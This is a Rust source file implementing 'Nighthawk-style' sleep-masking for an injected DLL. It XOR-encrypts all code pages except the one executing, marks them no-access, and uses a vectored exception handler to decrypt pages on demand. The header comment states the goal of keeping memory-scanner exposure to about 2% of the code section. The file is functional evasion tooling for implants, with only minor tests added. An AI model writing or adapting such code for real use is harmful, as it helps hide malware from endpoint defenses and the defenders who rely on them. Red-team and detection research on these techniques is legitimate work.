//! Nighthawk-style page-level encryption for the injected DLL's code section.
//!
//! At init, all code pages except the currently executing one are XOR-encrypted
//! and marked `PAGE_NOACCESS`. A Vectored Exception Handler intercepts access
//! violations: it decrypts the faulted page, re-encrypts the previously active
//! page, and resumes execution. At any given moment only one code page is
//! readable, limiting memory-scanner exposure to ~2% of the code section.

// ── Windows implementation ──────────────────────────────────────────────────

#[cfg(windows)]
mod inner {
    use std::sync::{
        Mutex,
        atomic::{AtomicBool, AtomicUsize, Ordering},
    };

    use windows::Win32::System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, EXCEPTION_POINTERS, RemoveVectoredExceptionHandler,
        },
        Memory::{
            PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VirtualProtect,
        },
    };

    const PAGE_SIZE: usize = 4096;
    const STATUS_ACCESS_VIOLATION: u32 = 0xC0000005;
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

    struct EncryptedPage {
        base: *mut u8,
        key: [u8; 16],
        encrypted: bool,
    }

    unsafe impl Send for EncryptedPage {}

    struct PageEncryptionManager {
        pages: Vec<EncryptedPage>,
        active_page: AtomicUsize,
        code_start: usize,
        code_end: usize,
    }

    unsafe impl Send for PageEncryptionManager {}
    unsafe impl Sync for PageEncryptionManager {}

    static MANAGER: Mutex<Option<PageEncryptionManager>> = Mutex::new(None);
    static MANAGER_PTR: AtomicUsize = AtomicUsize::new(0);
    static ACTIVE: AtomicBool = AtomicBool::new(false);
    static VEH_HANDLE: AtomicUsize = AtomicUsize::new(0);

    unsafe fn xor_page(page: *mut u8, key: &[u8; 16]) {
        unsafe {
            for i in 0..PAGE_SIZE {
                *page.add(i) ^= key[i % 16];
            }
        }
    }

    unsafe fn set_page_protection(
        base: *mut u8,
        protection: PAGE_PROTECTION_FLAGS,
    ) -> Result<(), &'static str> {
        unsafe {
            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(base as *const _, PAGE_SIZE, protection, &mut old_protect)
                .map_err(|_| "VirtualProtect failed")
        }
    }

    unsafe fn encrypt_page(page: &mut EncryptedPage) -> Result<(), &'static str> {
        if page.encrypted {
            return Ok(());
        }
        unsafe {
            set_page_protection(page.base, PAGE_READWRITE)?;
            xor_page(page.base, &page.key);
            set_page_protection(page.base, PAGE_NOACCESS)?;
            page.encrypted = true;
        }
        Ok(())
    }

    unsafe fn decrypt_page(page: &mut EncryptedPage) -> Result<(), &'static str> {
        if !page.encrypted {
            return Ok(());
        }
        unsafe {
            set_page_protection(page.base, PAGE_READWRITE)?;
            xor_page(page.base, &page.key);
            set_page_protection(page.base, PAGE_EXECUTE_READ)?;
            page.encrypted = false;
        }
        Ok(())
    }

    unsafe extern "system" fn veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
        unsafe {
            let info = &*info;
            let record = &*info.ExceptionRecord;

            if record.ExceptionCode.0 as u32 != STATUS_ACCESS_VIOLATION {
                return EXCEPTION_CONTINUE_SEARCH;
            }

            let mgr_ptr = MANAGER_PTR.load(Ordering::Acquire);
            if mgr_ptr == 0 {
                return EXCEPTION_CONTINUE_SEARCH;
            }
            let mgr = &mut *(mgr_ptr as *mut PageEncryptionManager);

            let fault_addr = record.ExceptionInformation[1];
            if fault_addr < mgr.code_start || fault_addr >= mgr.code_end {
                return EXCEPTION_CONTINUE_SEARCH;
            }

            let page_idx = (fault_addr - mgr.code_start) / PAGE_SIZE;
            if page_idx >= mgr.pages.len() {
                return EXCEPTION_CONTINUE_SEARCH;
            }

            let prev_idx = mgr.active_page.swap(page_idx, Ordering::AcqRel);
            if prev_idx < mgr.pages.len() && prev_idx != page_idx {
                let _ = encrypt_page(&mut mgr.pages[prev_idx]);
            }

            let _ = decrypt_page(&mut mgr.pages[page_idx]);

            EXCEPTION_CONTINUE_EXECUTION
        }
    }

    /// # Safety
    /// - `dll_base` must be the base address of the loaded DLL.
    /// - `code_size` must be the size of the code section in bytes.
    /// - Must be called before any other thread accesses the code section.
    pub unsafe fn init(dll_base: *const u8, code_size: usize) -> Result<(), &'static str> {
        if ACTIVE.load(Ordering::Acquire) {
            return Err("page encryption already active");
        }

        let num_pages = code_size.div_ceil(PAGE_SIZE);
        if num_pages == 0 {
            return Err("code section is empty");
        }

        let code_start = dll_base as usize;
        let code_end = code_start + num_pages * PAGE_SIZE;

        let current_rip = init as *const () as usize;
        let active_idx = if current_rip >= code_start && current_rip < code_end {
            (current_rip - code_start) / PAGE_SIZE
        } else {
            0
        };

        let mut pages = Vec::with_capacity(num_pages);
        for i in 0..num_pages {
            let base = (code_start + i * PAGE_SIZE) as *mut u8;
            let mut key = [0u8; 16];
            getrandom::getrandom(&mut key).map_err(|_| "failed to generate random key")?;
            pages.push(EncryptedPage {
                base,
                key,
                encrypted: false,
            });
        }

        for (i, page) in pages.iter_mut().enumerate() {
            if i != active_idx {
                unsafe {
                    encrypt_page(page)?;
                }
            }
        }

        let mgr = PageEncryptionManager {
            pages,
            active_page: AtomicUsize::new(active_idx),
            code_start,
            code_end,
        };

        let mut guard = MANAGER.lock().map_err(|_| "failed to lock manager")?;
        *guard = Some(mgr);
        let mgr_ref = guard.as_mut().unwrap() as *mut PageEncryptionManager;
        MANAGER_PTR.store(mgr_ref as usize, Ordering::Release);

        unsafe {
            let handle = AddVectoredExceptionHandler(1, Some(veh_handler));
            if handle.is_null() {
                if let Some(ref mut m) = *guard {
                    for page in m.pages.iter_mut() {
                        let _ = decrypt_page(page);
                    }
                }
                MANAGER_PTR.store(0, Ordering::Release);
                *guard = None;
                return Err("AddVectoredExceptionHandler failed");
            }
            VEH_HANDLE.store(handle as usize, Ordering::Release);
        }

        ACTIVE.store(true, Ordering::Release);
        tracing::info!(
            pages = num_pages,
            active = active_idx,
            "page encryption initialized — {:.1}% plaintext exposure",
            100.0 / num_pages as f64
        );

        Ok(())
    }

    /// # Safety
    /// Must not be called while other threads are actively executing encrypted
    /// pages.
    pub unsafe fn cleanup() {
        if !ACTIVE.swap(false, Ordering::AcqRel) {
            return;
        }

        let handle = VEH_HANDLE.swap(0, Ordering::AcqRel);
        if handle != 0 {
            unsafe {
                RemoveVectoredExceptionHandler(handle as *mut _);
            }
        }

        MANAGER_PTR.store(0, Ordering::Release);

        if let Ok(mut guard) = MANAGER.lock() {
            if let Some(ref mut mgr) = *guard {
                for page in mgr.pages.iter_mut() {
                    if page.encrypted {
                        unsafe {
                            let _ = decrypt_page(page);
                        }
                    }
                }
            }
            *guard = None;
        }

        tracing::info!("page encryption cleaned up — all pages restored");
    }

    pub fn is_active() -> bool {
        ACTIVE.load(Ordering::Acquire)
    }
}

// ── macOS / non-Windows stubs ───────────────────────────────────────────────

#[cfg(not(windows))]
mod inner {
    /// # Safety
    /// Stub — no actual memory manipulation occurs.
    pub unsafe fn init(_dll_base: *const u8, _code_size: usize) -> Result<(), &'static str> {
        Ok(())
    }

    /// # Safety
    /// Stub — no actual cleanup occurs.
    pub unsafe fn cleanup() {}

    pub fn is_active() -> bool {
        false
    }
}

#[allow(unused_imports)]
pub use inner::*;

/// Page size constant (4KB).
pub const PAGE_SIZE: usize = 4096;

/// XOR-encrypt or decrypt a buffer in place using a 16-byte key.
pub fn xor_encrypt_decrypt(data: &mut [u8], key: &[u8; 16]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key[i % 16];
    }
}

/// Calculate the number of pages needed to cover `size` bytes.
pub fn page_count(size: usize) -> usize {
    size.div_ceil(PAGE_SIZE)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_is_self_inverse() {
        let key: [u8; 16] = [
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB,
            0xCD, 0xEF,
        ];
        let original: Vec<u8> = (0..PAGE_SIZE).map(|i| (i & 0xFF) as u8).collect();
        let mut data = original.clone();

        xor_encrypt_decrypt(&mut data, &key);
        assert_ne!(data, original, "encrypted data should differ from original");

        xor_encrypt_decrypt(&mut data, &key);
        assert_eq!(data, original, "decrypting should restore original data");
    }

    #[test]
    fn xor_all_zeros_key_is_identity() {
        let key = [0u8; 16];
        let original: Vec<u8> = (0..256).map(|i| i as u8).collect();
        let mut data = original.clone();

        xor_encrypt_decrypt(&mut data, &key);
        assert_eq!(data, original, "XOR with zero key should be identity");
    }

    #[test]
    fn page_count_exact_multiple() {
        assert_eq!(page_count(4096), 1);
        assert_eq!(page_count(8192), 2);
        assert_eq!(page_count(4096 * 50), 50);
    }

    #[test]
    fn page_count_rounds_up() {
        assert_eq!(page_count(1), 1);
        assert_eq!(page_count(4097), 2);
        assert_eq!(page_count(8193), 3);
    }

    #[test]
    fn page_count_zero() {
        assert_eq!(page_count(0), 0);
    }

    #[test]
    fn stubs_do_not_panic() {
        #[cfg(not(windows))]
        {
            unsafe {
                assert!(init(std::ptr::null(), 0).is_ok());
                cleanup();
            }
            assert!(!is_active());
        }
    }

    #[test]
    fn xor_encrypt_decrypt_partial_page() {
        let key: [u8; 16] = [0xFF; 16];
        let mut data = vec![0xAAu8; 100];
        let original = data.clone();

        xor_encrypt_decrypt(&mut data, &key);
        assert_ne!(data, original);

        xor_encrypt_decrypt(&mut data, &key);
        assert_eq!(data, original);
    }
}
